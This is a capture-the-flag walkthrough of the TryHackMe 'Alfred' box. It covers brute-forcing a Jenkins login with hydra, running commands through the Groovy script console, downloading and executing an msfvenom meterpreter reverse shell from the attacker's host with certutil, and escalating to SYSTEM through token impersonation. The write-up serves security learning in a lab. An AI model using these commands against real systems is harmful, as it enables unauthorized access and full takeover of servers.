Alfred is a tryhackme windows box which has a vulnerable jenkins server.

# Enumeration and Initial access

Let’s run a quick nmap to scan for open ports and enumerate services.

```bash
nmap -sC -sV -T4 -Pn $IP -oA nmap/scan
```

Here is the short output of the scan

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-02 18:09 +01
Nmap scan report for 10.10.22.71 (10.10.22.71)
Host is up (0.067s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy

Nmap done: 1 IP address (1 host up) scanned in 5.91 seconds
```

Interesting enough, we got 3 ports open

- both 80 and 8080 are running http
- 3389 indicating rdp

Visiting the website on port `80`, we get nothing interesting.

Let’s visit the one on port `8080`

A jenkin server !!

We can either try some guessing, or try to bruteforce the login form.

Let’s do both !!

### Guessing

Digging a bit in google, I found out that the default username is `admin`, but what about the password?

I tried `password` as some say , didn’t work…

I tried admin:admin and it worked!!

### Bruteforcing

Let’s use hydra, but first let’s run `burpsuite` to capture the endpoint that handles the post request, as well as the parameters that are sent along with the request.

<img src="/../assets/582fc1ff0326420ab98d2e7ce4949dca/Untitled%202.png" alt="img" >

- endpoint : `/j_acegi_security_check`
- params : `j_username=xd&j_password=xd&from=&Submit=Sign+in`

We also need an error message upon login failure.

<img src="/../assets/582fc1ff0326420ab98d2e7ce4949dca/Untitled%203.png" alt="img" >

- error_message : `Invalid username or password`

Ok now we are ready to build our hydra command.

```bash
hydra -s 8080 -l admin -P /usr/share/seclists/Passwords/Common-Credentials/best1050.txt -I -f  10.10.22.71 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=&Submit=Sign+in:Invalid username or password"
```

Here we go !

# Getting a reverse shell

Now that we have access to jenkins, we can exploit the `jenkins console`

Going to `/script` endpoint, we can execute some `java groovy` commands in the console.

Let’s run `whoami` as a proof of concept.

```groovy
def cmd = "cmd.exe /c whoami".execute();
println("${cmd.text}");
```

<img src="/../assets/582fc1ff0326420ab98d2e7ce4949dca/Untitled%205.png" alt="img" >

We basically have arbitrary command execution, we can pop a reverse shell whenever we want.

We will be using `msfvenom` along with `Metasploit` to get somewhat a stable shell.

### Msfvenom

Let’s generate a meterpreter reverse shell.

```groovy
msfvenom -p windows/meterpreter/reverse_tcp -f exe -a x86  --encoder x86/shikata_ga_nai LHOST=10.11.60.242 LPORT=1337 -o yariss_shell.exe
```

### Metasploit

```groovy
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
```

Now thar our listener is ready, let’s download our reverse shell in the target machine.

First, let’s setup a quick python server in our `yariss_shell.exe` location

```bash
python -m http.server 80 
```

Now let’s head to the `script console` and execute this script

```bash
def cmd = "cmd.exe /c certutil.exe -urlcache -f http://10.11.60.242/yariss_shell.exe yariss_shell.exe".execute();
println("${cmd.text}");
```

This will run `certutil.exe` to download our shell.

We can check if it got downloaded

<img src="/../assets/582fc1ff0326420ab98d2e7ce4949dca/Untitled%206.png" alt="img" >

And it has been downloaded successfully, we can now run it.

```groovy
def cmd = "cmd.exe /c yariss_shell.exe".execute();
println("${cmd.text}"); 
```

Boom, we are in !

```groovy
[*] Started reverse TCP handler on 10.11.60.242:1337 
[*] Sending stage (175686 bytes) to 10.10.22.71
[*] Meterpreter session 1 opened (10.11.60.242:1337 -> 10.10.22.71:49310) at 2024-02-02 18:35:46 +0100

After roaming around a bit, I found the user flag !

```bash
cat 'C:\Users\bruce\Desktop\user.txt'

```

# Privilege escalation

Now that we have initial access to the machine, we want to escalate our privileges to a more powerful entity.

One way to do so is by `impersonation` of tokens.

Since we already are in a meterpreter shell, this will be easy for us.

There is a module called `incognito`, which does this for us.

First, let’s load it and use it.

```bash
meterpreter > use incognito 
Loading extension incognito...Success.
```

We can list all tokens with the following command

```bash
meterpreter > list_tokens -g
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM

Delegation Tokens Available
========================================
\
BUILTIN\Administrators
BUILTIN\Users
NT AUTHORITY\Authenticated Users
NT AUTHORITY\NTLM Authentication
NT AUTHORITY\SERVICE
NT AUTHORITY\This Organization

NT SERVICE\CertPropSvc
NT SERVICE\CscService
NT SERVICE\iphlpsvc

NT SERVICE\SessionEnv
NT SERVICE\TrkWks
NT SERVICE\UmRdpService

NT SERVICE\Winmgmt
NT SERVICE\wuauserv

Impersonation Tokens Available
========================
```

Even though you have a higher privileged token, you may not have the permissions of a privileged user (this is due to the way Windows handles permissions - it uses the Primary Token of the process and not the impersonated token to determine what the process can or cannot do).

Ensure that you migrate to a process with correct permissions (the above question's answer). The safest process to pick is the services.exe process. First, use the *ps* command to view processes and find the PID of the services.exe process. Migrate to this process using the command *migrate PID-OF-PROCESS*

```bash
meterpreter > impersonate_token 'BUILTIN\Administrators'
[-] Warning: Not currently running as SYSTEM, not all tokens will be available
             Call rev2self if primary process token is SYSTEM
[+] Delegation token available
[+] Successfully impersonated user NT AUTHORITY\SYSTEM
meterpreter > pgrep services.exe

meterpreter > migrate 668

```

Congrats, we officially rooted the machine !

That was all for this writeup, I hope you enjoyed it.
